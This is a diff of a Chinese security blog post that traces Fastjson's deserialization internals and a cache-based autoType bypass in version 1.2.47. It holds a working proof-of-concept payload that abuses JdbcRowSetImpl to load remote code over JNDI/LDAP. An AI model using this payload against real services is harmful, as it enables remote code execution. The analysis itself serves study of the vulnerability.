@@ -298,14 +298,14 @@
 <p><code>parseObject</code>：返回 <code>fastjson.JSONObject</code> 类</p>
 <p><code>parse</code> ：返回我们的类 <code>User</code></p>
 <p>可以发现在都是默认输入的情况下，<code>parseObject</code> 会返回 parseObject，parse 则会返回我们的 Student 类</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/TwoFastjsonUnserialize.png" class>
 
 <p>但是我们可以通过在 parseObject 参数中传入类，从而达到和 parse 相同的效果</p>
 <p><code>parseObject(input,Object.class)</code> （这里同样可以传入 Student.class）, 发现此时也变成了 Student 类</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/TwoStudent.png" class>
 
 <p>这里我们深入看一下 JSON 类里面的 parseObject 和 parse 方法</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/JSONMethods.png" class>
 
 <ul>
 <li>可以看到此处，parse 方法和 parseObject 方法被重写了很多，我们挑一些使用到的方法看一看。因为参数都是大同小异。</li>
@@ -314,7 +314,7 @@
 
 <p>传入两个参数，一个是 <code>String text</code>，这是我们要拿去反序列化解析的字符串。另外一个参数是 Feature，Feature 并没有什么特别大的用处，如果没有选择该 Feature，那么在反序列的过程中，FastJson 会自动把下划线命名的 Json 字符串转化到驼峰式命名的 Java 对象字段中。</p>
 <p>在自己调试打断点的过程当中，发现 <code>DefaultJSONParser#parseObject</code> 里面有一个 <code>TypeUtils.loadClass()</code>，一直想不起来在哪条链子里面见到过，如果有见到过的师傅请提醒一下我；总感觉这里有点攻击隐患的味道在。</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/maybeAttack.png" class>
 
 <blockquote>
 <p>这里我自己调试了一遍代码，发现有的东西和   Mi1k7ea 师傅讲的似乎有些许区别。</p>
@@ -327,31 +327,31 @@
 <h3 id="为什么-Fastjson-在反序列化的时候会自动调用-getter-x2F-setter"><a href="#为什么-Fastjson-在反序列化的时候会自动调用-getter-x2F-setter" class="headerlink" title="为什么 Fastjson 在反序列化的时候会自动调用 getter&#x2F;setter"></a>为什么 Fastjson 在反序列化的时候会自动调用 getter&#x2F;setter</h3><p>断点下在 <code>DefaultJSONParser#parseObject</code> 下，因为前面的过程都是在互相调用，可以直接看这里的业务层。</p>
 <p>开始调试，走到第 639 行这里，跟进一下 <code>derializer.deserialze()</code>，<code>deserialze()</code> 方法做的业务比较特殊：如果传进来要解析的类是 Array 数组类，就直接进行 <code>newInstance()</code> 的实例化，并且将数组数据返回。</p>
 <p>如果传进来的不是 Array 数组类，而是 Object 类，或是不可以反序列化的类，就会走到下一个业务方法的 <code>parseObject()</code> 里面。</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/deserialzeMethod.png" class>
 
 <p>继续往下跟，会走到新的 <code>DefaultJSONParser#parseObject</code> 下</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/newDefaultJSONParserMethod.png" class>
 
 <p>这一个 <code>DefaultJSONParser#parseObject</code> 的业务流程是先做了一个基础的判断，判断是去判断 token 是否相同，关于 Fastjson Token 可以看这篇文章，因为这位师傅讲的非常清晰，我这里就不做自我总结了，这个东西看懂就可以。</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45854465/article/details/120626835" >https://blog.csdn.net/qq_45854465/article/details/120626835<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45854465/article/details/120626835">https://blog.csdn.net/qq_45854465/article/details/120626835<i class="fas fa-external-link-alt"></i></a></p>
 <p>继续往下，在 322 行这里的 <code>TypeUtils.loadClass()</code> 可以提一嘴，我之前一直觉得这个地方是有攻击潜力的，包括在下面也看到了 <code>clazz.newInstance()</code> 的代码，一度以为可以打。并且此处的<code>config.getDefaultClassLoader()</code> 我觉得是可控的，在问了 Y4tacker 爷之后，Y4 师傅说这里是没用的，因为只是实例化了一个类。</p>
 <p>后续我找到了为啥看这个地方很眼熟，是因为 Fastjson 1.2.25 版本当中，把 <code>TypeUtils.loadClass()</code> 换成了 <code>checkAutoType()</code>，而 <code>TypeUtils.loadClass()</code> 的代码中是有逻辑问题的，因此可以造成些许绕过。</p>
 <p>还有的是 1.2.47 的那个通杀 EXP，在 1.2.48 版本之前的 EXP 都是能够通过 <code>TypeUtils.loadClass()</code> 来绕过的，因为它能会把第一次 <code>@type</code> 的结果缓存到 Map 当中。</p>
 <p>重新回到代码里面，<code>DefaultJSONParser</code> 类的 367 行，把 <code>deserializer</code> 的值拿出来，赋给 ObjectDeserializer deserializer，跟进一下</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/getDeserializer.png" class>
 
 <p>跟过来是一个方法，继续往下跟进具体的业务方法</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/derializersBusiness.png" class>
 
 <p>前面都是做了很多数据处理，到第 461 行这里，跟进。</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/createJavaBeanDeserializer.png" class>
 
 <p>继续往下走，终于才能看到我们的主角登场了 <code> JavaBeanInfo#build</code></p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/build.png" class>
 
 <h4 id="JavaBeanInfo-build"><a href="#JavaBeanInfo-build" class="headerlink" title="JavaBeanInfo#build"></a>JavaBeanInfo#build</h4><p><code>JavaBeanInfo#build</code> 先通过反射获取我们 <code>@type</code> 里面要去反序列化的那个类的一些基本信息。</p>
 <p>继续往下走，里面有一个 for 循环，当中把 <code>@type</code> 类对应的 Methods 全部拿出来。</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/getMethods.png" class>
 
 <p>首先会遍历 methods 中所有的 method 方法，然后会经过四个判断，只要符合任意一个判断就会触发 continue 跳出当前循环，所以必须要满足下面列出来的五个方法才能顺利执行，否则就会跳出当前循环（ps：这里和代码中的判断要反一反）</p>
 <ol>
@@ -361,10 +361,10 @@
 <li>传入参数个数必须为1</li>
 <li>方法开头必须是set</li>
 </ol>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/getPropertyName.png" class>
 
 <p>最后将可用的 setter 方法放到 fieldList 里面，如图</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/fieldList.png" class>
 
 <p>此时，在 fieldList 当中，我们有三个 FieldInfo，这也就是我们的三个 setter 方法。</p>
 <p>下面我们来看 getter 方法是如何被获取到的，其实是大同小异。首先会遍历 methods 中的每个方法，同样的如果要顺利执行下去需要符合四个条件</p>
@@ -375,17 +375,17 @@
 <li>方法返回的类型必须继承自 Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
 <li>传入的参数个数需要为 0</li>
 </ol>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/getMethods.png" class>
 
 <p>同样的如果符合上面要求的就会添加到 FieldInfo 中，在我 Student 类里面，只有 <code>gqetProperties</code> 方法符合预期，所以只获取到了 <code>getProperties</code> 方法</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/PropertiesMap.png" class>
 
 <p>最后返回 JavaBeanInfo，beanInfo 中会存放我们类中的各种信息</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/JavaBeanInfo.png" class>
 
 <p>后续，在 <code>JavaBeanDeserializer#deserialze</code> 方法中，对 FieldInfo 进行循环遍历，将每一个可用的 setter 与 getter 方法拿出来，具体的触发流程是这样的：</p>
 <p>第 593 行，<code>fieldDeser.setValue(object, fieldValue);</code>，跟进之后是反射调用方法的语句</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/Exec.png" class>
 
 <ul>
 <li>至此，分析过程全部结束</li>
@@ -404,9 +404,9 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span></span><br><span class="line">                + <span class="string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span></span><br><span class="line">                + <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>开始调试，用的 Fastjson 版本是 1.2.47 的；</p>
-<p>简单说一下原理，具体的可以看 <a class="link"   target="_blank" rel="noopener" href="http://localhost:4000/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#toc-heading-20" >Java反序列化Fastjson篇03-Fastjson各版本绕过分析<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单说一下原理，具体的可以看 <a class="link" target="_blank" rel="noopener" href="http://localhost:4000/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#toc-heading-20">Java反序列化Fastjson篇03-Fastjson各版本绕过分析<i class="fas fa-external-link-alt"></i></a></p>
 <p>在运行完毕后会返回一个 obj，这个 obj 里面是类名以及其对应的属性值，这个属性值会保存到 map 里面，如图</p>
-
+<img src="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/mapPut.png" class>
 
 <p>这个 map 放了原本的值，也就是我们说的缓存，可以通过 <code>TypeUtils.getClassFromMapping()</code> 来加载，太妙了，太妙了。我之前看 snakeYaml 也有类似的 map，但是并未进行操作，到时候可以看一看。</p>
 
